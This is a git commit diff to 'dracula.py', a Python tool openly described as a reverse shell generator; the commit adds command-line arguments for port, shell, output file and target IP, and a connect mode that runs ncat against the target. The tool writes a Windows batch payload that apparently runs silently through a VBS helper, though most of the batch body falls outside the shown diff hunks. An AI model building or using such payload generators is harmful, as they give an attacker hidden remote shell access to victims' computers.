9b9961a3e9c18c17f67b1861c0cc95ecb2775cfd
chet-ag09 <you@example.com>
2025-02-23 02:41:56 +0530

    added arguments

--- dracula.py
+++ dracula.py
@@ -1,23 +1,24 @@
 import os
 import subprocess
+import argparse
 
-os.system('cls' if os.name == 'nt' else 'clear')
-#adding the title ig
-print("""
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
 
-  _____                       _       
- |  __ \                     | |      
- | |  | |_ __ __ _  ___ _   _| | __ _ 
- | |  | | '__/ _` |/ __| | | | |/ _` |
- | |__| | | | (_| | (__| |_| | | (_| |
- |_____/|_|  \__,_|\___|\__,_|_|\__,_|
-                                      
-        Reverse shell generator                                       
+def print_banner():
+    print("""
+     _____                       _       
+    |  __ \                     | |      
+    | |  | |_ __ __ _  ___ _   _| | __ _ 
+    | |  | | '__/ _` |/ __| | | | |/ _` |
+    | |__| | | | (_| | (__| |_| | | (_| |
+    |_____/|_|  \__,_|\___|\__,_|_|\__,_|
+                                        
 
 """)
+    print("[-] Use -h for help")
 
-
-def generate_and_execute_batch(port, shell):
+def generate_and_execute_batch(port, shell, ouput_file):
 
     batch_script = f"""@echo off
 
@@ -56,23 +57,55 @@ del run_silent.vbs
 exit
 """
     try:
-        with open(batch_file_name+".bat", "w") as f:
+        with open(args.output+".bat", "w") as f:
             f.write(batch_script)
+            print(f"\nSUCCESS!!! CREATED {args.output}.bat ")
 
     except subprocess.CalledProcessError as e:
         print(f"Error executing batch script: {e}")
     except Exception as e:
         print(f"An error occurred: {e}")
 
-print("[0] Generate Reverse shell file [1] Help [2] Exit")
-main = input("Enter Choice>>> ")
-if "0" in main:
-    port_number = input("Enter the port number>>> ") 
-    shell_type = input("Enter the shell >>> ")
-    batch_file_name = input("Enter the name of the file>>> ")
 
-    generate_and_execute_batch(port_number, shell_type)
-elif "1" in main:
-    print("Dracula generate a batch file(works only on windows)")#ADD ACTUAL HELP 
-else:
-    exit()
+clear_screen()
+print_banner()
+
+while True:
+    dracula_cm = input("Dracula >> ").split()
+    parser = argparse.ArgumentParser(description="Generate a reverse shell payload in form of a batch file.")
+    parser.add_argument("-p", "--port", help="Port number for the reverse shell")
+    parser.add_argument("-s", "--shell", help="Shell type ex- cmd, bash, powershell etc.")
+    parser.add_argument("-o", "--output", help="Output file name.")
+    parser.add_argument("-l", "--connect", action="store_true",help="Connects with the target if the target opened file.")
+    parser.add_argument("-i", "--ip",help="Specify the ip adress of target")
+
+    try:
+        args = parser.parse_args(dracula_cm)
+        if args.connect:
+            if args.port: 
+                print("Starting connect on port", args.port)
+                try:
+                    subprocess.run(["ncat", args.ip, str(args.port)], check=True)
+                except subprocess.CalledProcessError as e:
+                    print(f"Error starting connect: {e}")
+                except FileNotFoundError:
+                    print("Error: ncat not found. Please install ncat.")
+                except Exception as e:
+                    print(f"Error starting connect: {e}")
+
+            else:
+                print("Error: -l/--connect requires -p/--port to be specified.")
+        elif args.port and args.shell and args.output: 
+            generate_and_execute_batch(args.port, args.shell, args.output)
+        elif args.port or args.shell or args.output:
+            print("Please specify all -p, -s and -o flags to generate the batch file.")
+        elif not dracula_cm:
+            pass
+        else:
+            print("Invalid arguments. Use -h for help.")
+
+
+    except SystemExit:
+        pass
+    except Exception as e:
+        print(f"An error occurred: {e}")
